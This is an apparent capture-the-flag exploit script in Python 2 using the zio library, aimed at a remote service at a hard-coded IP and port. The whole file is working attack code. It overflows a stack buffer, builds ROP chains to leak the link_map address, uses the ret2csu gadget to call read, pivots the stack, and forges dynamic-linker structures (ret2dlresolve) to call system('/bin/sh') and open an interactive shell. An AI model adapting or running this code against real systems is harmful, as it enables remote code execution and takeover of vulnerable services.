from zio import *

io  = zio(('119.28.63.211', 2332), print_read = COLORED(REPR, 'red'), print_write = COLORED(REPR, 'blue'), timeout = 100000)
# io  = zio('./pwn100_strip', print_read = COLORED(REPR, 'red'), print_write = COLORED(REPR, 'blue'), timeout = 100000)
# io = zio(('119.28.63.211', 2332), print_read = False, print_write = False, timeout = 10000)
#io.hint([0x4006b7])

junk        = 0x48

plt_puts    = 0x0000000000400500
plt_resolve = 0x00000000004004f0
got_read    = 0x0000000000601028
got_puts    = 0x0000000000601018
got_linkmap = 0x0000000000601008

leave_ret   = 0x000000000040068c
pop_rbp_ret = 0x0000000000400595
pop_rdi_ret = 0x0000000000400763 
p4_ret      = 0x000000000040075c

adr_stage   = 0x0000000000601000 + 0x800

adr_rel_plt         = 0x0000000000400450
adr_dyn_sym         = 0x00000000004002c0
adr_dyn_str         = 0x0000000000400380
adr_fake_rel_plt    = adr_stage + 0x100
adr_fake_dyn_sym    = adr_stage + 0x208
adr_fake_dyn_str    = adr_stage + 0x300
adr_shell           = adr_stage + 0x400

com_part1           = 0x40075a
com_part2           = 0x400740

adr_entry           = 0x400550

def prepare(address):
    payload0  = 'A' * junk
    payload0 += l64(pop_rdi_ret)
    payload0 += l64(address)
    payload0 += l64(plt_puts)
    payload0 += l64(adr_entry)
    payload0  = payload0.ljust(0xc8, 'A')
    io.w(payload0)
    io.rl()

def leak(address, size):
    count       = 0
    buf         = ''
    while count < size:
        prepare(address + count)
        # leak(str(address + count))
        while True:
            ch = io.read(1, timeout = 0x10)
            #print ch
            count += 1
            if ch == '\n':
                buf += '\x00'
                break
            else:
                buf += ch[0]
    #print '{} ==> {}'.format(hex(address), leak_data.encode('hex'))
    leak_data = buf[:size]
    return leak_data

def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
    payload  = l64(part1)   # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret
    payload += l64(0x0)     # rbx be 0x0
    payload += l64(0x1)     # rbp be 0x1
    payload += l64(jmp2)    # r12 jump to
    payload += l64(arg3)    # r13 -> rdx    arg3
    payload += l64(arg2)    # r14 -> rsi    arg2
    payload += l64(arg1)    # r15 -> edi    arg1
    payload += l64(part2)   # part2 entry will call [rbx + r12 + 0x8]
    payload += 'A' * 56     # junk
    return payload

adr_linkmap = l64(leak(got_linkmap, 0x8))
print '[+] leak link_map\t:\t' + hex(adr_linkmap)

# overwrite link_map+0x1c8 0x0, read fake structure
payload0  = 'A' * junk
payload0 += com_gadget(com_part1, com_part2, got_read,
        arg1 = 0x0,
        arg2 = adr_linkmap + 0x1c8,
        arg3 = 0x8)
payload0 += l64(adr_entry)
payload0  = payload0.ljust(0xc8, 'A')
io.w(payload0)
io.rl()
io.w(l64(0x0))

payload0  = 'A' * junk
payload0 += com_gadget(com_part1, com_part2, got_read,
        arg1 = 0x0,
        arg2 = adr_stage,
        arg3 = 0x500)
payload0 += l64(adr_entry)
payload0  = payload0.ljust(0xc8, 'A')
io.w(payload0)
io.rl()

payload0  = 'A' * junk
payload0 += l64(pop_rbp_ret)
payload0 += l64(adr_stage)
payload0 += l64(leave_ret)
payload0  = payload0.ljust(0xc8, 'A')

# fake structure
align_rel_plt   = 0x8*3 - (adr_fake_rel_plt - adr_rel_plt) % (0x8 * 3)
payload1  = 'A' * 0x8
payload1 += l64(pop_rdi_ret) # set $rdi "/bin/sh"
payload1 += l64(adr_shell)
payload1 += l64(plt_resolve)
payload1 += l64((adr_fake_rel_plt - adr_rel_plt + align_rel_plt) / (0x8 * 3))
payload1 += l64(0xdeadbeef)
payload1  = payload1.ljust(0x100, 'A')

align_dyn_sym   = 0x8*3 - (adr_fake_dyn_sym - adr_dyn_sym) % (0x8 * 3)
payload1 += 'A' * align_rel_plt
payload1 += l64(got_read)
payload1 += l64((adr_fake_dyn_sym - adr_dyn_sym + align_dyn_sym)/(0x8*3)*0x100000000 + 0x7)
payload1  = payload1.ljust(0x208, 'A')

payload1 += 'A' * align_dyn_sym
payload1 += l32(adr_fake_dyn_str - adr_dyn_str)
payload1 += l32(0x12)
payload1 += l64(0x0)
payload1 += l64(0x0)
payload1  = payload1.ljust(0x300, 'A')

payload1 += 'system\x00'
payload1  = payload1.ljust(0x400, 'A')

payload1 += '/bin/sh\x00'

payload1  = payload1.ljust(0x500, 'A')

io.w(payload1)

io.w(payload0)
io.rl()

io.interact()
